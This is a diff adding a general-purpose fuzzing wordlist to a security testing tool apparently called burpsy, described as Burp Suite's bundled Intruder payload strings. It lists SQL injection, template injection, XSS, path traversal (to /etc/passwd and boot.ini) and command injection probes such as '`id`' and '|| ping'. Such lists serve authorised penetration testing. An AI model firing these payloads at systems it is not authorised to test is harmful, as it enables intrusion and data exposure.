@@ -1,0 +1,47 @@
+# burpsy bundled wordlist: General-purpose fuzzing strings (quick list)
+# Source: Burp Suite's own shipped Intruder payload resource (PayloadStrings), reproduced
+#   verbatim from the files PortSwigger bundles with Burp Suite itself.
+# Licence basis: these ARE PortSwigger's shipped payloads, carried over as-is; unlike
+#   burpsy's other starter lists, this content is not third-party OWASP/SecLists material —
+#   it is Burp's own bundled data, redistributed here as plain wordlist files.
+# Placeholders such as {base}, {domain}, {file} are Burp's template syntax and are
+#   preserved as-is; the attack engine substitutes them at send time.
+'
+''
+\
+\\
+{base}-0
+{base}*1
+{base}'||'
+{base}'+'
+{base}' '
+"
+""
+{base}"||"
+{base}/*_*/
+'{base}'
+"{base}"
+({base})
+`
+{base}'--
+{base}')-- 
+{base}'))-- 
+{base}'#
+{base}')# 
+{base}'))# 
+{base}' and 'z'='z
+{base}' or 'z'='z
+{base}" or "z"="z
+}}
+${77*77}
+{{77*77}}
+xsstest'"><
+/{base}
+./{base}
+../{base}
+../../../../../../../../../../etc/passwd
+..\..\..\..\..\..\..\..\..\..\boot.ini
+{base}))))))))))
+{base}|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &
+`id`
+{base};echo 111111
